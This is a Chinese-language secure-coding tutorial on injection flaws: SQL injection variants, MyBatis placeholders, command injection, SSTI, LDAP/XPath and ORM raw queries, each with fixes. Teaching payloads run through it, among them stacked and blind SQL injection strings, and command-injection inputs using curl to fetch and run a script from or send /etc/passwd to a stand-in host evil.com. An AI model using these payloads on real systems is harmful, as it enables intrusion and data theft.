开始前

所有注入的统一模型

SQL 注入、命令注入、模板注入、LDAP 注入看着五花八门，底层是同一个失误。记住这个三段模型，后面每个模块都只是在换"汇聚点"。

入口
一切不可信数据：表单、URL 参数、Header、Cookie、JSON body、上传的文件名，甚至数据库里已存的数据（二阶注入）
汇聚点
数据被拼进"代码"的地方：SQL 语句、shell 命令、模板源码、LDAP 过滤器、XPath 表达式
防线
在汇聚点之前把数据无害化：参数化绑定、白名单、转义。防线必须卡在汇聚点，不能只卡在入口

一个 30 秒就能复现的最小实验（Python + SQLite 内存库）

# 在自己电脑上跑一遍，比读十页原理都直观
import sqlite3
conn = sqlite3.connect(':memory:')
conn.execute("CREATE TABLE users(id INTEGER, name TEXT)")
conn.execute("INSERT INTO users VALUES(1,'admin')")
conn.execute("INSERT INTO users VALUES(2,'zhangsan')")

# 危险写法：字符串拼接
name = "x' OR '1'='1"
sql = "SELECT * FROM users WHERE name = '" + name + "'"
print(sql)                      # SELECT * FROM users WHERE name = 'x' OR '1'='1'
print(conn.execute(sql).fetchall())  # 注入了：把整张表都查了出来

# 安全写法：参数绑定
print(conn.execute("SELECT * FROM users WHERE name = ?", (name,)).fetchall())
# 返回空列表 —— 同样的输入，被当成一个"值"而不是"代码"
关于攻击 payload 的边界：本文列出的 payload 全部只用于防御教学——理解"输入为什么能改变语义"，才知道防线该卡在哪一层。任何未授权系统上的测试都是违法的，渗透测试必须在获得书面授权、隔离环境内进行。每个 payload 出现的地方，都紧跟修复方案。
模块 1

SQL 注入原理与五大变体

SQL 注入的根因只有一句话：开发者把用户输入拼进了 SQL 字符串，而 SQL 解析器分不清哪部分是"结构"、哪部分是"数据"。攻击者用引号提前闭合字符串，就能把自己的内容写进 SQL 的语法结构里。

// 后端拼出的 SQL（危险写法）
SELECT * FROM users WHERE name = '张三' AND pw = '...'

// 攻击者在用户名字段输入：x' OR '1'='1
SELECT * FROM users WHERE name = 'x' OR '1'='1' AND pw = '...'
// OR '1'='1' 永真，登录判断被绕过 —— 这就是最古老的注入形态

五大变体，按"能不能直接看到数据"排列

变体原理怎么判断存在教学 payload
报错注入构造让数据库报错的语句，把查询结果带进错误信息里回显页面直接打印 SQL 异常（生产没关错误回显）' AND updatexml(1,concat(0x7e,version()),1)--
布尔盲注页面真假表现不同（内容有无、长度差异），逐字符猜解数据条件真假时页面响应可区分' AND SUBSTRING(db_name(),1,1)='a'--
时间盲注用延迟函数把真假转成响应时间差，逐个比特猜响应时间出现 5 秒级差异' AND IF(1=1,SLEEP(5),0)--
堆叠查询用 ; 结束当前语句再执行第二条（UPDATE/DELETE 等写操作）驱动允许多语句执行x'; UPDATE users SET pw='x' WHERE name='admin'--
二阶注入恶意数据先"合法"存入数据库，之后被另一段代码取出拼进新 SQL 时才触发需要两段业务配合，常规扫描器扫不出来注册用户名 admin'#，后续查询拼接时语义被改写
为什么时间盲注最防不胜防：页面回显被关掉、真假响应又被打磨成一致时，攻击者还有最后一招 —— 让数据库"睡"5 秒。SLEEP(5)、BENCHMARK()、pg_sleep() 都是这类信号源。数据库响应时间的异常抖动，本身就是一条该告警的安全信号。
注释符细节：MySQL 里 -- 后面必须跟空格或控制字符才生效，# 也可以作注释；不同数据库注释符不同，这也是拼接党翻车的重灾区。
防御预告：以上所有变体，在参数化查询面前全部失效 —— 因为引号、分号、注释符作为"数据"传进去时，根本进不了语法解析阶段。下一模块讲清楚这为什么成立。
模块 2

参数化查询与预编译的本质

"用 PreparedStatement 防注入"人人都背过，但多数人说不出为什么。说不出为什么，就会在该用 ${} 的地方手滑。

预编译防注入的三个步骤

第一步：带 ? 的 SQL 模板先发给数据库。数据库解析这条 SQL 的语法结构（哪些是关键字、哪些是表名列名），生成执行计划。此时 ? 只是占位符，还没有值。
第二步：参数以"值"的形式单独绑定。驱动把参数按协议发给数据库，数据库把它塞进执行计划的数据槽位 —— 只当数据，不再解析。
第三步：执行。所以参数里哪怕是 ' OR '1'='1，对数据库来说也只是一个"长得像 SQL 的普通字符串"，没有任何语法地位。
对比项字符串拼接预编译占位
解析时机每次执行都要重新解析整条 SQLSQL 结构只解析一次，参数不参与解析
参数地位参数是 SQL 源码的组成部分参数是值，与语法结构物理隔离
注入可能性引号可闭合字符串，分号可结束语句，语义可被改写无语法结构可改写，注入面为零
附带收益无执行计划可复用，高并发场景还有性能收益

三端对照：危险 vs 安全

// ===== Java / JDBC =====
// 危险
String sql = "SELECT * FROM users WHERE name = '" + name + "'";
conn.createStatement().executeQuery(sql);

// 安全
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
ps.setString(1, name);          // 参数只进数据槽位
ps.executeQuery();

// ===== Python / sqlite3、pymysql、psycopg2 通用 =====
// 危险
cur.execute("SELECT * FROM users WHERE name = '%s'" % name)     // % 格式化 = 拼接
cur.execute(f"SELECT * FROM users WHERE name = '{name}'")       // f-string = 拼接

// 安全：第二个参数是参数序列，驱动层绑定
cur.execute("SELECT * FROM users WHERE name = %s", (name,))

// ===== Node / mysql2 =====
// 危险：query() 会对字符串做拼接，别被"它也有第二个参数"骗了
conn.query("SELECT * FROM users WHERE name = '" + name + "'")

// 安全：execute() 走预编译协议
conn.execute("SELECT * FROM users WHERE name = ?", [name])

哪些位置不能参数化（重点，翻车高发区）

位置能否参数化安全做法
WHERE 的等值 / 范围条件可以正常 ? / %s 绑定
LIKE 的通配值可以把 % 拼在参数值里或 SQL 侧固定，别拼用户输入：WHERE name LIKE CONCAT('%', ?, '%')
IN 列表可以按元素个数生成对应数量的 ?，如 WHERE id IN (?,?,?)；MyBatis 用 foreach 生成 #{} 列表
LIMIT / OFFSET多数可以MySQL PreparedStatement 支持 LIMIT 位置绑定参数；不能绑定时转 int 再拼
表名 / 列名不可以白名单枚举映射：用户传 sort=time，代码映射为 created_at，只认白名单里的键
ORDER BY 方向不可以只接受 ASC / DESC 两个常量，其余抛异常
白名单是唯一正确解法：动态表名、排序列这类"标识符"位置，标准做法是维护一张 Map<String,String>（用户可选值 → 真实列名），用户传的 key 不在 Map 里就直接拒绝。永远不要"校验一下字符"就拼进去——黑名单防不住编码变形、注释截断、大小写混淆。
模块 3

MyBatis：${} vs #{}，一道经典送命题

这是国内 Java 面试出现频率最高的安全题之一。一句话答案：#{} 是预编译占位符，${} 是字符串拼接。但面试官真正想听的是"你知道 ${} 在什么情况下还可以安全使用"。

占位符机制安全性
#{name}生成 ? 占位符，通过 JDBC 预编译绑定，等价于 PreparedStatement.setString安全。参数只进数据槽位，注入面为零
${name}在构建 SQL 字符串阶段就把值直接拼进 SQL，不做任何转义危险。用户可控的 ${} 等于直接拼接，注入必中
<!-- 危险：表名来自用户输入 -->
<select id="query">
  SELECT * FROM ${tableName} WHERE name = #{name}
</select>
// 如果 tableName 可控：user; DROP TABLE audit_log -- 之类的语义改写

<!-- 安全：ORDER BY 字段用 choose 白名单枚举 -->
<select id="list">
  SELECT * FROM article
  <choose>
    <when test="sort == 'time'">ORDER BY created_at DESC</when>
    <when test="sort == 'hot'">ORDER BY views DESC</when>
    <otherwise>ORDER BY id DESC</otherwise>
  </choose>
</select>
// 用户传什么都不能跳出这三个分支 —— 这就是白名单

两个高频真实场景的正确写法

<!-- 场景一：LIKE 模糊查询。错误做法是把 % 拼在 ${} 里 -->
<!-- 错误：WHERE name LIKE '%${kw}%' -->
<!-- 正确一：用 CONCAT，% 在 SQL 侧，值走 #{} -->
WHERE name LIKE CONCAT('%', #{kw}, '%')
<!-- 正确二：用 <bind> 先在 Java 侧拼好值，再走 #{} -->
<bind name="pattern" value="'%' + kw + '%'"/>
WHERE name LIKE #{pattern}

<!-- 场景二：IN (?,?,?) 列表。错误做法是 ${ids} 直接拼 -->
<!-- 错误：WHERE id IN (${ids}) -->
<!-- 正确：foreach 为每个元素生成一个 #{} -->
<foreach collection="ids" item="id" open="(" separator="," close=")">#{id}</foreach>
MyBatis 的例外位置只有一处：动态表名、动态列名这类"标识符"。而且必须过白名单（Map 映射或 choose 枚举），${} 的原值绝不能直接来自请求参数。
排查命令：全局搜索 XML 里的 ${，逐个确认值的来源。Mapper 接口上的 @Param 注解不提供任何转义，别指望它。同样的规则适用于所有"字符串替换型"模板引擎——JPA 的 createNativeQuery 拼接、SQLAlchemy 的 text() 里 f-string、Prisma 的 $queryRawUnsafe，都在这个危险名单里（模块 7 汇总）。
模块 4

命令注入与进程调用安全

命令注入的原理和 SQL 注入完全同构：不可信数据被拼进 shell 命令字符串，shell 的元字符（; | & ` $() 换行）让攻击者提前结束原命令、追加自己的命令。

# 业务本意：让用户填一个 IP，执行 ping
# 用户输入：127.0.0.1; cat /etc/passwd
ping -c 1 127.0.0.1; cat /etc/passwd   # ; 后面的命令照常执行
# 用户输入：$(curl evil.com/x.sh | sh)   —— 命令替换同样成立
# 用户输入：127.0.0.1 | curl -d @/etc/passwd evil.com —— 数据外带

三端危险写法 vs 安全写法

// ===== Python =====
// 危险：shell=True 时字符串整体交给 shell 解析，元字符全部生效
subprocess.call(f"ping -c 1 {ip}", shell=True)
os.system(f"ping -c 1 {ip}")              // os.system 永远过 shell，没有安全形态

// 安全：列表形式 + shell=False，参数不经 shell 解析
subprocess.run(["ping", "-c", "1", ip], check=True)
// 确实需要管道 / 重定向时，用 shlex.quote 转义每个片段，或改用管道 API
shlex.quote(ip)   // 把不可信值包成安全字面量：'127.0.0.1; rm -rf /'

// ===== Java =====
// 危险：单字符串形式会经过 shell 解析（等价于 sh -c）
Runtime.getRuntime().exec("ping -c 1 " + ip);
// 危险：显式包一层 sh -c，转义全部前功尽弃
Runtime.getRuntime().exec(new String[]{"sh","-c","ping -c 1 " + ip});

// 安全：数组形式，每个参数独立传递，不经 shell 解析
new ProcessBuilder("ping", "-c", "1", ip).start();
// 注意：exec(String[]) 不会解析元字符，这是防命令注入的关键形态

// ===== Node =====
// 危险：默认 spawn 一个 shell 来执行
exec(`ping -c 1 ${ip}`)
// 安全：execFile / spawn 的 args 数组，不经过 shell
execFile("ping", ["-c", "1", ip], cb)
两个容易漏的角落：
① 数组形式不等于万能。某些命令本身就能执行代码：find . -exec、awk 'BEGIN{system(...)}'、git clone --upload-pack。参数数组只保证"参数不被 shell 解析"，不保证被调程序不把参数当代码。
② 能不要 shell 就不要 shell。如果业务只是取文件大小、读日志，用语言内置 API（Python pathlib / Java Files.size / Node fs.stat）完成，比 exec 一个命令又安全又可测。
最小权限兜底：进程以低权限用户运行（容器里 USER app、不用 privileged）、文件系统只读挂载、出网白名单。命令注入防不住的那一天，这些决定损失上限。
模块 5

模板注入（SSTI）

模板引擎（Jinja2、FreeMarker、Velocity、Thymeleaf、Handlebars）的设计初衷是"把数据填进模板"。一旦用户输入被当成模板源码而不是模板数据，注入就升级成了代码执行 —— 因为模板语法本身就是一门编程语言。

检测到利用的经典链条（Jinja2，仅示意原理）

# 第一步：探测是否把输入当模板渲染 —— 数学运算是否被求值
输入 {{7*7}}  →  页面出现 49   # 中招了：输入被求值而不是原样显示
输入 ${7*7}   →  页面出现 49   # 同上，说明后端可能是 FreeMarker 类引擎

# 第二步（教学原理，不展开完整链）：模板上下文里的对象可以被遍历
{{ config }}                    # Flask 应用可能泄露 SECRET_KEY 等配置
{{ ''.__class__.__mro__ }}      # Python 对象链：字符串 → 类 → 父类 → ...
# 沿对象链最终可到达子类查找与内建函数，实现任意代码执行
# 防御视角只需记住：用户输入一旦进模板源码，RCE 只是时间问题

危险写法 vs 安全写法（Python / Flask）

// 危险：render_template_string 把用户输入当模板源码渲染
@app.route("/hello")
def hello():
    name = request.args.get("name")
    return render_template_string("Hello " + name)   // name = {{7*7}} 即被求值

// 安全：输入作为模板变量传递，模板文件是开发者写死的
@app.route("/hello")
def hello():
    name = request.args.get("name")
    return render_template("hello.html", name=name)   // hello.html: Hello {{ name }}
// name 里的 {{ }} 会被原样输出，因为它是"数据"不是"模板"
形态是否安全说明
render_template("page.html", x=user_input)安全模板源码来自开发者，输入只是变量值
render_template_string(user_input)危险输入即模板源码，SSTI 直接成立
render_template_string("... " + user_input)危险拼接即注入，与 SQL 拼接同构
模板文件在数据库/文件系统里、可被用户改危险"可编辑的模板"是产品功能也是攻击面，必须做权限与审计
邮件/短信模板用用户填的字段渲染取决于来源模板体必须来自代码/配置，用户数据只做变量注入
Java 侧的同类问题：FreeMarker 的 Template(String) 直接渲染用户字符串、Velocity 的 evaluate()、历史上 Struts2 的 OGNL 表达式注入（大量 CVE 的根源）都是同一模式。判据只有一个：被渲染的"模板源码"是否包含用户可控内容。
模块 6

LDAP 与 XPath 注入

LDAP 和 XPath 用的也是"字符串拼查询表达式"模式，所以注入形态与 SQL 完全平行 —— 只是语法从 SQL 换成了过滤器表达式。面试和代码审计里出现频率低，但一旦中招，后果是认证绕过或目录数据全量泄露。

LDAP 注入：闭合过滤器的括号

# 正常过滤器：在 ou=users 下找 uid=用户输入 的条目
(&(uid=张三)(password=xxx))

# 攻击输入：*)(uid=*))(|(uid=*
(&(uid=*)(uid=*))(|(uid=*)(password=xxx))
# 逻辑被改写为永真条件，认证绕过 / 遍历整个目录

# 防护一：按 RFC 4515 转义 LDAP 过滤器特殊字符
# \ → \5c    ( → \28    ) → \29    * → \2a    NUL → \00    / → \2f
# 防护二（首选）：用框架的过滤 API 而非拼字符串
// Spring LDAP：Filter 构建器，参数走转义通道
Filters.equal("uid", userInput).and(Filters.equal("password", pw))
// Java JNDI 同理：new BasicAttributes + 属性 API，不要拼 searchFilter 字符串

XPath 注入：XML 查询的同款问题

<!-- 危险：用 XPath 查 XML 里的用户节点 -->
String expr = "/users/user[username='" + name + "']";
// 攻击输入：x' or '1'='1
/users/user[username='x' or '1'='1']   // 永真，返回所有用户节点

// 防护：用 XPath 变量绑定而不是拼字符串
XPath xpath = factory.newXPath();
xpath.setXPathVariableResolver(...);        // $name 变量由 API 绑定
"/users/user[username=$name]"
// 变量值不会被解析为 XPath 语法，注入面为零 —— 与 SQL 参数化同一思想
共同教训：凡是"字符串拼查询语言"的模式 —— SQL、LDAP 过滤器、XPath、JMESPath、GraphQL 查询拼接 —— 都遵循同一条铁律：查询结构必须是代码写死的，用户数据只能走"值"的通道（参数绑定 / 变量绑定 / 转义）。新接触一种查询语言时，先问一句：它有变量绑定机制吗？有，就用它。
模块 7

ORM 的注入面与防御纵深

用了 ORM 不代表天然免疫。ORM 自动防注入只覆盖它自己生成的查询；一旦调用"原生 SQL"接口，保护就交还给你了。

框架 / 接口安全用法危险用法
JPA / Hibernate
createNativeQuery		createNativeQuery("... WHERE name = ?1").setParameter(1, name)字符串拼进 SQL 再 createNativeQuery
Spring Data
@Query		@Query("... WHERE name = :name") + @Param 绑定@Query 里 f-string / SpEL 拼值；JPQL 拼字符串
Django ORMUser.objects.filter(name=name)（自动参数化）.raw("... '%s'" % name)、.extra(where=["..."])
SQLAlchemytext("... :name").bindparams(name=name) 或 ORM 查询text(f"... '{name}'") 或 session.execute 拼字符串
Prisma$queryRaw 带模板参数：Prisma.sql`... ${name}`$queryRawUnsafe 拼接字符串（名字里的 Unsafe 是认真的）
MyBatis#{} 占位（模块 3）${} 接收可控值
Mongoose (MongoDB)查询操作符按类型使用（值不会变成查询语法）$where 传字符串、Aggregate $function、把对象整体当查询条件不过滤键

防御纵深：四层防线，各管一段

第一层 · 参数化查询（修复层）：所有 SQL / 命令 / 模板的汇聚点用参数绑定。这一层是"修复"，其他层都只是"缓解"。
第二层 · 输入校验与白名单（收缩层）：类型校验（ID 必须是整数）、长度限制、枚举白名单。把攻击面从"任意字符串"收缩到"有限形态"。
第三层 · 数据库最小权限（止损层）：应用账号只授 DML 权限，禁 DROP / FILE / SUPER；连接串关掉 allowMultiQueries=true 让堆叠查询失效；按业务分库分账号。
第四层 · WAF 与监控（缓解层）：WAF 拦常见 payload，DB 审计日志记录异常查询。注意：这两层是"缓解"，永远不是"修复"。
为什么 WAF 只是缓解不是修复：WAF 靠规则匹配特征，而攻击者可以用编码变形（URL / Unicode / 十六进制）、大小写混淆、注释截断、分块传输、参数污染等方式绕过。被 WAF 拦住的 payload 有无数种写法，被参数化挡住的注入只有一种归宿：变成普通字符串。任何把 WAF 当"已修复"上线关单的行为，都是在给事故记账。

三语言"危险 vs 安全"终版对照

// ===== Java（JDBC / MyBatis / ProcessBuilder）=====
// ✗ 危险
"SELECT * FROM t WHERE id = " + id
"SELECT * FROM ${table} ORDER BY ${col}"            // MyBatis ${} 收可控值

// ✓ 安全

ORDER BY 用 Map<String,String> 白名单映射 + choose 枚举
new ProcessBuilder("tar","-czf", out, fileName).start()  // 数组形式

// ===== Python（sqlite3 / pymysql / subprocess / Jinja2）=====
// ✗ 危险
cur.execute(f"SELECT * FROM t WHERE id = {id}")
subprocess.run(f"tar -czf {out} {name}", shell=True)
render_template_string("Hi " + name)

// ✓ 安全
cur.execute("SELECT * FROM t WHERE id = ?", (id,))

// ===== Node（mysql2 / execFile / EJS）=====

// ✓ 安全
pool.execute("SELECT * FROM t WHERE id = ?", [id])
execFile("tar", ["-czf", out, name], cb)
ejs.render(readFileSync("t.ejs"), data)       // 模板体来自代码库

上线前六项自查

搜拼接：全库搜索 SQL 字符串拼接（+ id、f-string、模板字符串、StringBuilder），每处确认已改参数化或已过白名单。
搜 ${：MyBatis XML 与注解里的 ${，逐个确认值不可由用户控制；Hibernate/JPA 的字符串拼接 SQL 同理。
搜 shell 入口：shell=True、os.system、Runtime.exec(String)、exec(，确认没有不可信参数直达。
搜模板渲染：render_template_string、ejs.render(变量)、Template(String)，确认模板源码不含用户输入。
收紧数据库账号：应用账号禁多语句（MySQL 连接串 allowMultiQueries=false）、禁 FILE / DROP 等高危权限。
补监控：慢查询日志、DB 审计、异常错误率告警 —— 时间盲注的 5 秒延迟、报错注入的异常堆量，都该在监控里留痕。
避坑

十个真实坑

1
以为用了 ORM 就自动免疫注入
ORM 只保护它自己生成的查询。createNativeQuery / raw() / text() / $queryRawUnsafe 这些"逃生舱"一旦拼字符串，保护立刻失效，且因为藏得深，代码审查更容易漏。
2
MyBatis 里用 ${} 接排序列 / 表名
"ORDER BY 不能参数化"成了用 ${} 的借口，但 ${} 收用户可控值就是裸拼。正确做法是 Map 白名单或 choose 枚举，永远别把请求参数原样喂给 ${}。
3
LIKE 查询把用户输入拼进通配符
"%'+name+'%" 这类写法让引号和 % 一起进 SQL。安全形态是 CONCAT('%', ?, '%') 或把 % 拼进参数值再整体绑定，值本身不走拼接通道。
4
IN (...) 列表直接拼 ID 字符串
WHERE id IN ("1,2,3") 拼接时，攻击者输入 "1); DROP TABLE t-- " 就能改写语义。按元素个数生成 ? 占位，或 MyBatis foreach 生成 #{} 列表。
5
忽略二阶注入：入库转义、取出裸拼
数据入库时经过了参数化/转义，一切正常；但另一段业务把它取出来拼进新 SQL / 新命令时没有防护，此时触发。修复要覆盖"取出来再用"的每一处，不能只守写入端。
6
Python 用 os.system 或 shell=True "图省事"
os.system 永远过 shell，没有任何安全形态；shell=True 让 ; | $() 全部生效。改用列表参数 + check=True，需要管道时用 shlex.quote 或管道 API。
7
Java 用 Runtime.exec("sh -c " + cmd)
exec(String[]) 本来是安全的（不过 shell），但包一层 sh -c 后所有转义前功尽弃，等价于把用户输入交给 bash。需要管道时逐段转义或用 ProcessBuilder 的 redirectPipe。
8
把用户输入 render_template_string 当模板渲染
Flask 的 render_template_string(user_input)、Node 的 ejs.render(userTemplate) 让用户输入变成模板源码，{{7*7}} 返回 49 即中招。输入永远走"模板变量"通道，模板体必须来自代码库。
9
以为 WAF 拦住了就是修复完了
WAF 是特征匹配，编码变形、注释截断、分块传输都能绕。WAF 属于"缓解层"，参数化才是"修复层"；把 WAF 当修复上线，等于把防线建在沙滩上。
10
数据库账号给太大，堆叠查询门户大开
应用账号拿着 DROP / FILE / SUPER 权限，连接串还开着 allowMultiQueries=true，一个注入点就能升级成拖库、写文件、拿权限。最小权限 + 关多语句，是把事故控制在"泄露"而不是"沦陷"的关键一步。
自测

六道题

1. 关于参数化查询（PreparedStatement）为什么能防 SQL 注入，哪个解释是对的？
正确答案：结构先编译、参数只做值绑定。数据库在解析 SQL 模板时 ? 只是占位符，之后传入的参数走独立的数据通道，永远进不了语法层 —— 所以引号、分号、注释符都只是普通字符串。它不是"过滤"，也不是"转义"。
2. MyBatis 中 #{} 和 ${} 的区别，正确的是？
正确答案：#{} 生成 ? 走预编译绑定，${} 在构建 SQL 阶段直接拼接。${} 唯一合理的用途是动态表名 / 列名，且必须白名单映射。与数字还是字符串无关 —— 数字位置用 ${} 一样危险。
3. 用户提交一个 IP，服务端要执行 ping。下面哪种写法是安全的？
正确答案：列表形式、不过 shell。参数以数组元素独立传递，; | $() 这些元字符不会被解析。shell=True 和 os.system 都会把整串交给 shell 解析，元字符全部生效。注意数组形式也不防"被调程序本身把参数当代码"（如 find -exec），配合最小权限使用。
4. 页面回显被关闭、真假响应也一致，攻击者还可以用什么手段从布尔盲注升级？
正确答案：时间盲注。当页面表现不可区分时，让数据库条件为真时睡 5 秒，用响应时间做信号，逐比特猜解数据。堆叠查询需要驱动支持多语句，报错注入需要错误回显 —— 两者都依赖额外条件，时间盲注是最后的通用手段。所以 DB 响应时间的异常抖动本身就该告警。
5. 关于 SSTI（模板注入），判断中招的最简方法是？
正确答案：{{7*7}} 看是否被求值。如果输入被原样显示，说明它是数据；如果出现 49，说明它被当成模板源码渲染 —— SSTI 成立，且模板语法是图灵完备的，离代码执行只差对象链。这也解释了防御：用户输入只能走"模板变量"通道（render_template + 变量），绝不能进 render_template_string。
6. 关于防御纵深，下面哪个说法是对的？
正确答案：WAF 属于缓解，参数化属于修复。WAF 靠特征匹配，编码变形、注释截断、分块传输都能绕过；输入校验同样可能漏（黑名单永远不完整）。只有参数绑定让数据物理上无法进入语法层，是根因层面的修复。各层是叠加关系，不是替代关系。
